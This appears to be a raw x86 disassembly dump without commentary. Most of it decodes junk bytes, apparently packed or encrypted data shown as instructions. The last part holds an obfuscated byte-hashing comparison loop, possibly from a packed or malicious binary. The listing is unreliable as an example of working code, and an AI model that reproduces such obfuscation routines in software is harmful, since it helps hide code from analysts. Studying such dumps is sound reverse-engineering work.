  41a71b:	jb     0x41a6cb
  41a71d:	push   ss
  41a71e:	sub    DWORD PTR [eax+0x4a1f6735],0x60
  41a725:	stos   DWORD PTR es:[edi],eax
  41a726:	mov    ah,cl
  41a728:	sbb    eax,0xdf5d4268
  41a72d:	xor    DWORD PTR [edi],ecx
  41a72f:	rol    DWORD PTR [ecx-0x7b045b1b],0x3c
  41a736:	mov    bh,0xbf
  41a738:	sub    BYTE PTR [ecx+0x4c],bh
  41a73b:	aaa    
  41a73c:	sbb    ebx,ebx
  41a73e:	pop    ebp
  41a73f:	pop    ss
  41a740:	jb     0x41a71f
  41a742:	ss jmp 0x41a777
  41a745:	mov    ds:0x5a59200e,al
  41a74a:	out    0x16,al
  41a74c:	cld    
  41a74d:	pushf  
  41a74e:	xchg   edx,eax
  41a74f:	dec    edx
  41a750:	or     DWORD PTR [ebx+0x6bd1b2b4],edx
  41a756:	push   0x724dcd46
  41a75b:	fcmovnb st,st(3)
  41a75d:	pop    ebx
  41a75e:	jne    0x41a6e3
  41a760:	or     al,0xfe
  41a762:	jmp    0xdf143219
  41a767:	mov    DWORD PTR [ebx+0x68],0x32f568ee
  41a76e:	iret   
  41a76f:	push   ebx
  41a770:	(bad)  
  41a771:	sub    al,0x47
  41a773:	bound  eax,QWORD PTR [edi+0x7c]
  41a776:	lods   al,BYTE PTR ds:[esi]
  41a777:	jmp    0x3b4c3cdf
  41a77c:	push   eax
  41a77d:	fcmove st,st(2)
  41a77f:	retf   0xbd1e
  41a782:	enter  0xe575,0x40
  41a786:	and    dh,BYTE PTR [ebx+0x11]
  41a789:	leave  
  41a78a:	mov    ebx,0xafdd4806
  41a78f:	mov    ds:0x2cacbc7f,al
  41a794:	jp     0x41a7c0
  41a796:	inc    ebx
  41a797:	fsub   QWORD PTR [eax]
  41a799:	pop    edi
  41a79a:	cmp    cl,0xe0
  41a79d:	push   es
  41a79e:	dec    edi
  41a79f:	icebp  
  41a7a0:	sub    DWORD PTR [ebp-0x1d788c6c],edi
  41a7a6:	cmp    ebp,eax
  41a7a8:	mov    esi,0x912dfb3c
  41a7ad:	rcl    BYTE PTR [ebx-0x7bc0419d],0x4a
  41a7b4:	repnz cmp eax,0xb3e075dd
  41a7ba:	cmp    BYTE PTR [esi+0x2d],bl
  41a7bd:	clc    
  41a7be:	daa    
  41a7bf:	jb     0x41a798
  41a7c1:	pop    ebp
  41a7c2:	arpl   WORD PTR [ebp+ebp*8-0x7ca2bd94],si
  41a7c9:	leave  
  41a7ca:	rol    bh,0x8f
  41a7cd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7ce:	ficom  DWORD PTR [edi-0x6]
  41a7d1:	push   esi
  41a7d2:	xchg   ebx,eax
  41a7d3:	push   esi
  41a7d4:	outs   dx,BYTE PTR ds:[esi]
  41a7d5:	push   ebx
  41a7d6:	mov    ch,0xe8
  41a7d8:	shl    DWORD PTR ds:[esi-0x12548c53],1
  41a7df:	ret    0x4b58
  41a7e2:	push   ebx
  41a7e3:	inc    ebx
  41a7e4:	sbb    al,0x11
  41a7e6:	nop
  41a7e7:	mov    esp,0xaedb07c9
  41a7ec:	add    al,0x96
  41a7ee:	aaa    
  41a7ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a7f0:	sbb    eax,0x9c078992
  41a7f5:	(bad)  [ebx+0x34]
  41a7f8:	inc    esp
  41a7f9:	neg    ecx
  41a7fb:	in     eax,0xa8
  41a7fd:	ret    
  41a7fe:	add    eax,0xa6d1d406
  41a803:	add    BYTE PTR [ecx-0x73],0xa9
  41a807:	and    BYTE PTR [ecx+0x62],ah
  41a80a:	fdiv   QWORD PTR [eax]
  41a80c:	mov    ebx,0x8231836b
  41a811:	sbb    al,0xcc
  41a813:	push   ds
  41a814:	mov    cs,ebp
  41a816:	jmp    0x41a824
  41a818:	xor    al,0x5d
  41a81a:	call   FWORD PTR [ecx+0x44]
  41a81d:	mov    ch,0xe0
  41a81f:	test   BYTE PTR [eax+eiz*4+0x632f50d5],bh
  41a826:	sbb    dl,BYTE PTR [esi]
  41a828:	push   ecx
  41a829:	mov    edi,0xea968d16
  41a82e:	pop    ebp
  41a82f:	pop    ebp
  41a830:	jns    0x41a847
  41a832:	mov    ds:0xae1eb865,al
  41a837:	ss fwait
  41a839:	loopne 0x41a82a
  41a83b:	pusha  
  41a83c:	jae    0x41a82a
  41a83e:	dec    esp
  41a83f:	lods   eax,DWORD PTR ds:[esi]
  41a840:	(bad)  
  41a841:	call   0xc25a:0x9b83fc7a
  41a848:	dec    DWORD PTR [eax]
  41a84a:	jmp    0x1043d770
  41a84f:	repz (bad) 
  41a851:	jne    0x41a891
  41a853:	mov    ds:0x99c94323,al
  41a858:	xchg   BYTE PTR [edi-0x3f],ch
  41a85b:	mov    ds:0xd4ddcfdc,al
  41a860:	pop    ecx
  41a861:	scas   eax,DWORD PTR es:[edi]
  41a862:	ds loope 0x41a87e
  41a865:	mov    edi,0x516a7f27
  41a86a:	je     0x41a89f
  41a86c:	pop    ds
  41a86d:	(bad)  
  41a86e:	dec    edi
  41a86f:	and    al,0x98
  41a871:	ins    DWORD PTR es:[edi],dx
  41a872:	(bad)  
  41a874:	dec    edi
  41a875:	popa   
  41a876:	add    al,0x48
  41a878:	xchg   esi,eax
  41a879:	stc    
  41a87a:	mov    eax,ds:0xa05e8620
  41a87f:	dec    eax
  41a880:	xor    eax,0xae2ac116
  41a885:	jge    0x41a824
  41a887:	int    0x71
  41a889:	aas    
  41a88a:	sahf   
  41a88b:	enter  0xdf2b,0x31
  41a88f:	pusha  
  41a890:	loop   0x41a8c3
  41a892:	mov    DWORD PTR [ecx-0x17],ebx
  41a895:	in     al,0x39
  41a897:	add    ah,BYTE PTR [ebp-0x2010170c]
  41a89d:	std    
  41a89e:	mov    esi,0xcbaa64f1
  41a8a3:	mov    eax,ds:0x9f9e753f
  41a8a8:	mov    WORD PTR [eax+0x271d64e8],0xcac3
  41a8b1:	ret    
  41a8b2:	jo     0x41a8d4
  41a8b4:	pop    ebx
  41a8b5:	jmp    0x41a869
  41a8b7:	add    BYTE PTR [edx+0x1870919a],ch
  41a8bd:	(bad)  
  41a8be:	pop    edi
  41a8bf:	int3   
  41a8c0:	or     al,0xcb
  41a8c2:	mov    bh,BYTE PTR [eax]
  41a8c4:	push   ecx
  41a8c5:	mov    cl,0x46
  41a8c7:	outs   dx,BYTE PTR ds:[esi]
  41a8c8:	das    
  41a8c9:	adc    eax,0x4f1de365
  41a8ce:	adc    eax,DWORD PTR [eax+0x56c9be0]
  41a8d4:	cmp    eax,0x998b9fde
  41a8d9:	pop    ebp
  41a8da:	gs inc esi
  41a8dc:	push   ds
  41a8dd:	or     al,0xd2
  41a8df:	rcl    BYTE PTR [ecx],cl
  41a8e1:	popf   
  41a8e2:	cmp    esp,esi
  41a8e4:	ret    
  41a8e5:	in     al,dx
  41a8e6:	dec    ebp
  41a8e7:	outs   dx,BYTE PTR ds:[esi]
  41a8e8:	test   BYTE PTR [ebx+0x6b8a6590],bh
  41a8ee:	xchg   esp,eax
  41a8ef:	pop    ebx
  41a8f0:	imul   esp,DWORD PTR [ebx+ebp*1],0xe9bc3031
  41a8f7:	jne    0x41a963
  41a8f9:	jecxz  0x41a89c
  41a8fb:	fwait
  41a8fc:	or     al,0x63
  41a8fe:	add    al,0x8a
  41a900:	lock ins BYTE PTR es:[edi],dx
  41a902:	xchg   edx,eax
  41a903:	xor    bh,dh
  41a905:	gs cmp ebp,ebx
  41a908:	add    al,0x44
  41a90a:	iret   
  41a90b:	cmc    
  41a90c:	je     0x41a8e4
  41a90e:	ret    
  41a90f:	mov    bl,0xcb
  41a911:	or     al,0x71
  41a913:	dec    al
  41a915:	mov    cl,0x59
  41a917:	sbb    DWORD PTR [ebp+0x49],edi
  41a91a:	pop    ecx
  41a91b:	sub    BYTE PTR [ebp+eiz*2-0x186abf2],dl
  41a922:	loope  0x41a94b
  41a924:	dec    ebp
  41a925:	push   es
  41a926:	dec    eax
  41a927:	ret    0x1020
  41a92a:	sub    DWORD PTR ds:[bx+si-0x77],ebp
  41a92f:	cmc    
  41a930:	scas   al,BYTE PTR es:[edi]
  41a931:	sub    BYTE PTR [edx-0x79],0xbb
  41a935:	or     bh,BYTE PTR [ecx]
  41a937:	push   ebp
  41a938:	rol    BYTE PTR [eax],cl
  41a93a:	add    DWORD PTR [ebx],edi
  41a93c:	jnp    0x41a95b
  41a93e:	xchg   edx,eax
  41a93f:	add    ebx,DWORD PTR [eax-0x1c]
  41a942:	sbb    DWORD PTR [ecx+0x8],ebx
  41a945:	(bad)  
  41a946:	xchg   ebp,eax
  41a947:	mov    eax,0x17014ec9
  41a94c:	test   eax,0x169553a4
  41a951:	lahf   
  41a952:	push   ebx
  41a953:	dec    ebp
  41a954:	xor    al,0x33
  41a956:	dec    DWORD PTR [ecx]
  41a958:	call   0x7d4d:0xedda5900
  41a95f:	ret    
  41a960:	jbe    0x41a922
  41a962:	pop    esi
  41a963:	push   esp
  41a964:	push   edx
  41a965:	icebp  
  41a966:	dec    ecx
  41a967:	mov    fs,WORD PTR [ecx]
  41a969:	xor    al,0x6b
  41a96b:	sahf   
  41a96c:	dec    ebx
  41a96d:	imul   edx,DWORD PTR [esi-0x76],0xf1932fa7
  41a974:	pop    eax
  41a975:	dec    edi
  41a976:	lods   eax,DWORD PTR ds:[esi]
  41a977:	jmp    0x6d83:0xe234eca
  41a97e:	and    al,0x1b
  41a980:	pop    esp
  41a981:	jae    0x41a91b
  41a983:	push   ecx
  41a984:	push   eax
  41a985:	fdivr  QWORD PTR ds:0x8a4fd426
  41a98b:	ja     0x41a9ea
  41a98d:	fidiv  WORD PTR [ebx]
  41a98f:	dec    ebp
  41a990:	imul   eax,DWORD PTR [esi+eax*8-0x16],0x461344f4
  41a998:	adc    DWORD PTR [ebx+0x74],0x25511fef
  41a99f:	fwait
  41a9a0:	into   
  41a9a1:	pushf  
  41a9a2:	shl    esi,cl
  41a9a4:	fucomp st(5)
  41a9a6:	stos   DWORD PTR es:[edi],eax
  41a9a7:	popa   
  41a9a8:	inc    edi
  41a9a9:	inc    esp
  41a9aa:	fnstenv ds:0xd9c91cbd
  41a9b0:	and    esi,eax
  41a9b2:	and    ebx,ebp
  41a9b4:	into   
  41a9b5:	sbb    eax,0x3f402c85
  41a9ba:	push   es
  41a9bb:	retf   
  41a9bc:	push   edx
  41a9bd:	(bad)  
  41a9be:	imul   esp,DWORD PTR [edx],0xa9e94853
  41a9c4:	div    BYTE PTR [eax]
  41a9c6:	xor    dl,BYTE PTR [ecx-0x5cea5a79]
  41a9cc:	outs   dx,DWORD PTR ds:[esi]
  41a9cd:	and    esp,eax
  41a9cf:	pusha  
  41a9d0:	inc    ebx
  41a9d1:	imul   esi,edx,0xffffffd6
  41a9d4:	xor    al,0x11
  41a9d6:	and    al,0xc1
  41a9d8:	mov    dl,0xb5
  41a9da:	cli    
  41a9db:	sub    al,0x14
  41a9dd:	xchg   ecx,eax
  41a9de:	pop    edx
  41a9df:	jge    0x41aa5d
  41a9e1:	(bad)  
  41a9e2:	clc    
  41a9e3:	inc    ebx
  41a9e4:	cli    
  41a9e5:	and    edi,DWORD PTR [eax+0x416ca330]
  41a9eb:	push   eax
  41a9ec:	or     eax,0x3e507662
  41a9f1:	mov    ah,0x5b
  41a9f3:	inc    esi
  41a9f4:	gs mov dl,0xd2
  41a9f7:	jl     0x41a9ee
  41a9f9:	jb     0x41a9c4
  41a9fb:	lods   eax,DWORD PTR ds:[esi]
  41a9fc:	mov    al,0x59
  41a9fe:	push   cs
  41a9ff:	shl    BYTE PTR [ebx+0x11],cl
  41aa02:	pop    esp
  41aa03:	hlt    
  41aa04:	mov    edi,0xbb5d9e11
  41aa09:	xchg   ebp,eax
  41aa0a:	push   ds
  41aa0b:	in     al,dx
  41aa0c:	cmp    DWORD PTR [ebp+0x41],esi
  41aa0f:	dec    ebp
  41aa10:	test   al,0xbb
  41aa12:	mov    esp,0x799a845f
  41aa17:	aaa    
  41aa18:	mov    edx,0xb970f867
  41aa1d:	and    al,0x18
  41aa1f:	jg     0x41aa77
  41aa21:	sar    ecx,1
  41aa23:	lock jl 0x41aa33
  41aa26:	in     eax,0x69
  41aa28:	popf   
  41aa29:	nop
  41aa2a:	in     al,dx
  41aa2b:	imul   eax,edx,0x19
  41aa2e:	ret    
  41aa2f:	test   eax,0x7a2ef2d9
  41aa34:	call   0xb939:0xf732beb1
  41aa3b:	and    dl,BYTE PTR [edx+0x35adfca4]
  41aa41:	and    bh,BYTE PTR [edx-0x1]
  41aa44:	retf   0x63b0
  41aa47:	jg     0x41a9e4
  41aa49:	loope  0x41a9fa
  41aa4b:	or     ebp,DWORD PTR [eax]
  41aa4d:	jae    0x41aa30
  41aa4f:	and    esi,esi
  41aa51:	mov    ebp,cs
  41aa53:	lea    edi,[eax+0x479f5047]
  41aa59:	sub    eax,0x96f0b3ff
  41aa5e:	dec    edx
  41aa5f:	cdq    
  41aa60:	addr16 cmc 
  41aa62:	cmp    al,0x79
  41aa64:	mov    fs,WORD PTR [eax+0x1fe2a521]
  41aa6a:	(bad)  
  41aa6b:	xchg   ebp,eax
  41aa6c:	xor    esi,DWORD PTR [edi+0x4b83d0dc]
  41aa72:	imul   edx,esp,0x2a
  41aa75:	mov    ebp,0x605b55c2
  41aa7a:	rcr    BYTE PTR [edx+edx*2],0xe
  41aa7e:	adc    al,0x3e
  41aa80:	fild   DWORD PTR [ecx-0xa6b261a]
  41aa86:	dec    esi
  41aa87:	repnz cli 
  41aa89:	lds    edi,FWORD PTR [edx-0x6b122c91]
  41aa8f:	gs pop ebp
  41aa91:	jmp    0x830d:0x50e86e82
  41aa98:	jecxz  0x41aa33
  41aa9a:	and    cx,WORD PTR [edi]
  41aa9d:	jle    0x41aa3e
  41aa9f:	adc    ah,bl
  41aaa1:	sub    eax,0xcd930c28
  41aaa6:	je     0x41aa2f
  41aaa8:	popa   
  41aaa9:	jge    0x41aa60
  41aaab:	push   ebx
  41aaac:	leave  
  41aaad:	mov    dl,0x48
  41aaaf:	xchg   ebp,eax
  41aab0:	frstor [edx+0x1f]
  41aab3:	sub    eax,0x3c747483
  41aab8:	into   
  41aab9:	and    al,0xdd
  41aabb:	push   0x1789d243
  41aac0:	inc    esi
  41aac1:	or     eax,0x47f43693
  41aac6:	add    eax,0xb910060a
  41aacb:	les    esi,FWORD PTR [edi-0x31]
  41aace:	fsub   st(1),st
  41aad0:	mov    bl,0x5a
  41aad2:	jmp    0xf60a:0xae084c74
  41aad9:	je     0x41aa79
  41aadb:	push   ds
  41aadc:	add    eax,0xba462bbc
  41aae1:	sbb    edx,ebx
  41aae3:	aam    0x8
  41aae5:	xchg   DWORD PTR [esi-0x4e3c0b5],esi
  41aaeb:	clc    
  41aaec:	cmp    edi,DWORD PTR [edx]
  41aaee:	pop    esi
  41aaef:	cmc    
  41aaf0:	xchg   esi,eax
  41aaf1:	into   
  41aaf2:	outs   dx,BYTE PTR ds:[esi]
  41aaf3:	xchg   BYTE PTR [esi+0x2eab450],ch
  41aaf9:	or     al,0xa5
  41aafb:	aad    0xc5
  41aafd:	push   cs
  41aafe:	ins    DWORD PTR es:[edi],dx
  41aaff:	std    
  41ab00:	xor    DWORD PTR ds:0xff525642,0x44
  41ab07:	jmp    0x14d8:0xc1d37c12
  41ab0e:	dec    esi
  41ab0f:	pop    ebx
  41ab10:	fidivr DWORD PTR [ecx+0x632748c9]
  41ab16:	mov    ch,0x57
  41ab18:	rol    DWORD PTR [edi*1+0x8b9bfb8],0x5a
  41ab20:	aaa    
  41ab21:	push   0xffffffe2
  41ab23:	xchg   esp,eax
  41ab24:	push   edx
  41ab25:	jge    0x41aae2
  41ab27:	stos   DWORD PTR es:[edi],eax
  41ab28:	add    BYTE PTR [edx],cl
  41ab2a:	cld    
  41ab2b:	adc    BYTE PTR [ebx],0xa9
  41ab2e:	mov    dl,0xa0
  41ab30:	xlat   BYTE PTR ds:[ebx]
  41ab31:	arpl   si,bp
  41ab33:	jmp    0xc1bd:0x77a62259
  41ab3a:	pop    es
  41ab3b:	lods   eax,DWORD PTR ds:[esi]
  41ab3c:	and    dl,dl
  41ab3e:	cmc    
  41ab3f:	aad    0xdf
  41ab41:	xchg   DWORD PTR [edx-0x356d782f],ecx
  41ab47:	nop
  41ab48:	push   eax
  41ab49:	mov    eax,edx
  41ab4b:	stos   DWORD PTR es:[edi],eax
  41ab4c:	xchg   bl,dh
  41ab4e:	pop    eax
  41ab4f:	push   esp
  41ab50:	mov    ebp,0x768a320b
  41ab55:	ds popa 
  41ab57:	xchg   bl,dh
  41ab59:	sub    al,0x4a
  41ab5b:	(bad)  
  41ab5c:	(bad)  
  41ab5d:	fsub   QWORD PTR ds:0x1a55693c
  41ab63:	je     0x41abb3
  41ab65:	jge    0x41ab0e
  41ab67:	fdivr  DWORD PTR [eax-0x43050b2f]
  41ab6d:	pop    eax
  41ab6e:	sti    
  41ab6f:	or     al,0x67
  41ab71:	mov    esi,0x2e695f5d
  41ab76:	inc    edx
  41ab77:	(bad)  
  41ab79:	adc    eax,edi
  41ab7b:	sub    ch,ah
  41ab7d:	dec    BYTE PTR [edx-0xfa3caff]
  41ab83:	sub    BYTE PTR [edx+ebp*1-0x426a2ae],dl
  41ab8a:	ret    0x550
  41ab8d:	and    ebx,esi
  41ab8f:	ins    DWORD PTR es:[edi],dx
  41ab90:	xchg   esi,eax
  41ab91:	jmp    0xc603e26f
  41ab96:	mov    ds:0xbac7af56,eax
  41ab9b:	es add cl,BYTE PTR gs:[esi]
  41ab9f:	or     al,0x84
  41aba1:	retf   0xaffb
  41aba4:	mov    edx,0x1019b484
  41aba9:	jbe    0x41ab45
  41abab:	sbb    esi,eax
  41abad:	sahf   
  41abae:	retf   0xb0b2
  41abb1:	sahf   
  41abb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41abb3:	jae    0x41ab93
  41abb5:	neg    DWORD PTR [edx-0x522305f4]
  41abbb:	push   cs
  41abbc:	out    dx,eax
  41abbd:	call   0x1e09:0xb12ea859
  41abc4:	sub    edi,esi
  41abc6:	test   al,0x41
  41abc8:	cmp    dh,BYTE PTR [ecx]
  41abca:	push   ecx
  41abcb:	das    
  41abcc:	push   ebx
  41abcd:	mov    al,ds:0x6af0ccd0
  41abd2:	(bad)
  41abd5:	mov    edx,0xa2210ce9
  41abda:	sti    
  41abdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abdc:	in     eax,0xb1
  41abde:	adc    esi,DWORD PTR [ebx-0x60f29ac2]
  41abe4:	mov    eax,ds:0xf753ad0a
  41abe9:	push   eax
  41abea:	pop    ebx
  41abeb:	push   eax
  41abec:	cmp    eax,DWORD PTR [ecx-0x6bd65e73]
  41abf2:	cmp    bl,BYTE PTR ds:0x1e536515
  41abf8:	or     edx,ebp
  41abfa:	jno    0x41aba0
  41abfc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abfd:	mov    ecx,0x85f4b882
  41ac02:	test   BYTE PTR [esi-0x596a943e],bl
  41ac08:	pop    ecx
  41ac09:	mov    ?,esp
  41ac0b:	mov    DWORD PTR [ebp-0x73aba0e4],eax
  41ac11:	jae    0x41ac31
  41ac13:	xor    ah,BYTE PTR [eax-0x4c]
  41ac16:	iret   
  41ac17:	xchg   edx,eax
  41ac18:	outs   dx,BYTE PTR ds:[esi]
  41ac19:	mov    esi,0x1dfdc8f4
  41ac1e:	loope  0x41ac27
  41ac20:	xchg   esp,eax
  41ac21:	fild   WORD PTR [ebp-0x1f]
  41ac24:	loope  0x41abf3
  41ac26:	pusha  
  41ac27:	ret    
  41ac28:	(bad)  
  41ac29:	fcomp  DWORD PTR [ebx]
  41ac2b:	popf   
  41ac2c:	and    edi,DWORD PTR [edx-0x3ee103b]
  41ac32:	add    DWORD PTR [ebx+0x48],ecx
  41ac35:	xchg   ebp,eax
  41ac36:	repnz pusha 
  41ac38:	mov    ah,0x6
  41ac3a:	sbb    BYTE PTR [ecx+0x69a4ca7c],ch
  41ac40:	fadd   QWORD PTR [ebx+ebp*4+0x39]
  41ac44:	push   ds
  41ac45:	push   ebp
  41ac46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ac47:	stos   BYTE PTR es:[edi],al
  41ac48:	pop    es
  41ac49:	lock jge 0x41acb5
  41ac4c:	and    al,0x61
  41ac4e:	jae    0x41abd1
  41ac50:	icebp  
  41ac51:	cmp    DWORD PTR [ebp-0x3456a996],0x5c5c5e55
  41ac5b:	jbe    0x41ac99
  41ac5d:	inc    edx
  41ac5e:	mul    al
  41ac60:	adc    BYTE PTR [edx+ebp*8],bl
  41ac63:	sbb    DWORD PTR [eax+0x1f794877],0x7b
  41ac6a:	loope  0x41ac54
  41ac6c:	stos   BYTE PTR es:[edi],al
  41ac6d:	fwait
  41ac6e:	xor    edx,eax
  41ac70:	inc    edx
  41ac71:	mov    cl,0x50
  41ac73:	out    0x78,eax
  41ac75:	mov    ah,0xff
  41ac77:	push   es
  41ac78:	xchg   edi,eax
  41ac79:	xor    DWORD PTR [ecx-0x24fa8c95],ecx
  41ac7f:	jmp    0x6eee:0xf2395d7b
  41ac86:	inc    ecx
  41ac87:	mov    edx,0x4bff7eb8
  41ac8c:	in     eax,dx
  41ac8d:	pop    ds
  41ac8e:	xchg   ebx,eax
  41ac8f:	xchg   ecx,eax
  41ac90:	push   esp
  41ac91:	int    0xc0
  41ac93:	push   edi
  41ac94:	ret    
  41ac95:	push   cs
  41ac96:	js     0x41ac6f
  41ac98:	xchg   ebp,eax
  41ac99:	xchg   edx,eax
  41ac9a:	jno    0x41ac6a
  41ac9c:	and    eax,ecx
  41ac9e:	test   BYTE PTR [edx+edx*8],bh
  41aca1:	loopne 0x41ace4
  41aca3:	sub    eax,0xb5bf30da
  41aca8:	add    eax,0xa7ca4867
  41acad:	sbb    al,0xa0
  41acaf:	cmp    DWORD PTR [esi+0x49035a9a],ebp
  41acb5:	cmp    BYTE PTR [edx-0x60],dl
  41acb8:	mov    esi,0x2eb7e41a
  41acbd:	inc    eax
  41acbe:	icebp  
  41acbf:	xchg   ebp,eax
  41acc0:	xchg   ebx,eax
  41acc1:	and    DWORD PTR [edx+0x37],ecx
  41acc4:	cwde   
  41acc5:	ss push eax
  41acc7:	dec    ecx
  41acc8:	pushf  
  41acc9:	lds    ecx,FWORD PTR [esi+ecx*1+0x33]
  41accd:	push   ecx
  41acce:	mov    edx,0x8d26cd5d
  41acd3:	pop    esi
  41acd4:	mov    ebp,0xd42f46b0
  41acd9:	mov    ch,0xf
  41acdb:	inc    esi
  41acdc:	je     0x41acda
  41acde:	bound  eax,QWORD PTR [esi+edx*4-0xfa3bf81]
  41ace5:	jge    0x41ad61
  41ace7:	popa   
  41ace8:	adc    DWORD PTR [edx-0x74],0x78c3ccf1
  41acef:	jg     0x41ace7
  41acf1:	push   ebp
  41acf2:	or     DWORD PTR [edi+esi*8+0x6d],ebp
  41acf6:	or     DWORD PTR [ebp+esi*1+0x70c9028d],esi
  41acfd:	adc    DWORD PTR [ebx+0x77],ebp
  41ad00:	push   0xcdffe126
  41ad05:	test   al,0xe8
  41ad07:	push   ebp
  41ad08:	jg     0x41ad48
  41ad0a:	xchg   ecx,eax
  41ad0b:	loope  0x41ac92
  41ad0d:	mov    ebx,0xd4267d6c
  41ad12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ad13:	stos   BYTE PTR es:[edi],al
  41ad14:	inc    edx
  41ad15:	pop    ecx
  41ad16:	push   ebx
  41ad17:	cmp    al,0xbd
  41ad19:	jg     0x41acb2
  41ad1b:	push   es
  41ad1c:	stc    
  41ad1d:	ins    DWORD PTR es:[edi],dx
  41ad1e:	icebp  
  41ad1f:	mov    WORD PTR [edi+0x1f9c9b27],?
  41ad25:	or     BYTE PTR [ecx-0x37],bh
  41ad28:	push   0xffffff8a
  41ad2a:	js     0x41ad63
  41ad2c:	mov    esi,0xd391dbf1
  41ad31:	mov    tr4,edi
  41ad34:	jae    0x41acdc
  41ad36:	aas    
  41ad37:	ins    BYTE PTR es:[edi],dx
  41ad38:	mov    eax,DWORD PTR [ecx]
  41ad3a:	pop    ebx
  41ad3b:	imul   eax,edi,0x15
  41ad3e:	sbb    cl,bh
  41ad40:	loop   0x41ad2b
  41ad42:	push   cs
  41ad43:	mov    ah,0x34
  41ad45:	lods   al,BYTE PTR ds:[esi]
  41ad46:	xor    BYTE PTR [edx+0x16fd8f84],bh
  41ad4c:	or     esi,DWORD PTR [edi-0x71]
  41ad4f:	push   ds
  41ad50:	into   
  41ad51:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad52:	adc    DWORD PTR [eax+0x2c],ebp
  41ad55:	ins    BYTE PTR es:[edi],dx
  41ad56:	cmovne esp,DWORD PTR [edx+0x89da8b]
  41ad5d:	cld    
  41ad5e:	mov    cl,0x17
  41ad60:	or     DWORD PTR [eax+0x7dd808a2],esi
  41ad66:	push   edi
  41ad67:	sub    DWORD PTR [esi-0x6b280f20],esi
  41ad6d:	imul   esp,DWORD PTR [ecx-0x45],0x5cb25108
  41ad74:	arpl   WORD PTR [edx+0x374aaaeb],si
  41ad7a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad7b:	dec    ecx
  41ad7c:	mov    cl,0x27
  41ad7e:	mov    ebp,0xce744a86
  41ad83:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ad84:	jbe    0x41ad1d
  41ad86:	inc    ecx
  41ad87:	sub    DWORD PTR [eax-0x19],edx
  41ad8a:	xchg   ecx,eax
  41ad8b:	aam    0xc7
  41ad8d:	cmp    eax,0x602f58e2
  41ad92:	jmp    0x41addd
  41ad94:	ds ds iret 
  41ad97:	aaa    
  41ad98:	sbb    DWORD PTR [edx+0x40],ecx
  41ad9b:	(bad)  
  41ad9d:	jge    0x41ad3c
  41ad9f:	jle    0x41adbb
  41ada1:	jge    0x41ad6a
  41ada3:	cli    
  41ada4:	push   edi
  41ada5:	das    
  41ada6:	nop
  41ada7:	mov    esi,DWORD PTR [edi]
  41ada9:	(bad)  
  41adaa:	pop    ds
  41adab:	jns    0x41ad9c
  41adad:	dec    esp
  41adae:	adc    BYTE PTR [edi],dh
  41adb0:	scas   eax,DWORD PTR es:[edi]
  41adb1:	xchg   ebp,eax
  41adb2:	pusha  
  41adb3:	push   esi
  41adb4:	mov    esi,0x1b6cb6b7
  41adb9:	push   0x987ea200
  41adbe:	dec    esp
  41adbf:	adc    DWORD PTR [ecx-0x2e],ebp
  41adc2:	push   0xffffffa2
  41adc4:	std    
  41adc5:	xor    al,0xb1
  41adc7:	rcr    DWORD PTR [edx*8+0x700bfce],0x5e
  41adcf:	cmp    al,0xee
  41add1:	les    edi,FWORD PTR [ebx]
  41add3:	adc    dl,BYTE PTR [edx]
  41add5:	pop    ebp
  41add6:	repnz ss (bad) 
  41add9:	ds cmp eax,0x1336b0bb
  41addf:	mov    BYTE PTR [ebx+eiz*1],0xef
  41ade3:	inc    esp
  41ade4:	and    bh,BYTE PTR [edx-0x58f01371]
  41adea:	jbe    0x41ae2e
  41adec:	mov    DWORD PTR [ebp-0x8],eax
  41adef:	push   DWORD PTR [ebp+0x18]
  41adf2:	jmp    0x41ae4b
  41adf7:	mov    ecx,DWORD PTR [ebp-0x8]
  41adfa:	add    ecx,eax
  41adfc:	mov    DWORD PTR [ebp-0x14],ecx
  41adff:	mov    ecx,DWORD PTR [ebp-0x14]
  41ae02:	mov    ecx,DWORD PTR [ecx+0xc]
  41ae05:	movsx  cx,BYTE PTR [ecx+eax*1]
  41ae0a:	mov    edx,0x3b4b
  41ae0f:	sub    cx,dx
  41ae12:	mov    edx,0x8a85
  41ae17:	xor    cx,dx
  41ae1a:	mov    edx,0x4f85
  41ae1f:	cmp    cx,dx
  41ae22:	jne    0x41adef
  41ae28:	mov    ecx,DWORD PTR ds:0x421c26
  41ae2e:	mov    ecx,DWORD PTR [ecx+0x198]
  41ae34:	mov    DWORD PTR [ecx],eax
  41ae36:	jmp    0x41ae5c
  41ae3b:	mov    ecx,DWORD PTR [ebp+0x18]
  41ae3e:	cmp    ecx,0xf89c85b5
  41ae44:	jne    0x41ae5c
  41ae4a:	push   eax
  41ae4b:	push   DWORD PTR [ebp+0x14]
  41ae4e:	push   DWORD PTR [ebp+0x10]
  41ae51:	push   DWORD PTR [ebp+0xc]
  41ae54:	push   DWORD PTR [ebp+0x8]
  41ae57:	call   0x413d37
  41ae5c:	pop    edi
  41ae5d:	pop    esi
  41ae5e:	leave  
  41ae5f:	ret    0x14
  41ae62:	push   ebp
  41ae63:	mov    ebp,esp
  41ae65:	push   ecx
  41ae66:	mov    DWORD PTR [ebp-0x4],0xf89c85ba
  41ae6d:	mov    eax,DWORD PTR [ebp-0x4]
  41ae70:	mov    ecx,DWORD PTR ds:0x42b010
  41ae76:	sbb    DWORD PTR ds:0x42a018,ecx
  41ae7c:	mov    edx,DWORD PTR [ebp+0x10]
  41ae7f:	mov    DWORD PTR ds:0x42801c,0x4950
  41ae89:	mov    ecx,0x7510893
  41ae8e:	sbb    DWORD PTR ds:0x428028,0x4a48
  41ae98:	xor    eax,ecx
  41ae9a:	add    DWORD PTR ds:0x42b000,0x42800c
  41aea4:	add    eax,0x3272db
  41aea9:	mov    DWORD PTR ds:0x42a014,0x169
  41aeb3:	mov    DWORD PTR [edx],eax
  41aeb5:	sbb    eax,edx
  41aeb7:	mov    eax,DWORD PTR [ebp+0xc]
  41aeba:	xor    eax,ecx
  41aebc:	inc    edx
  41aebd:	push   esi
  41aebe:	xor    esi,edx
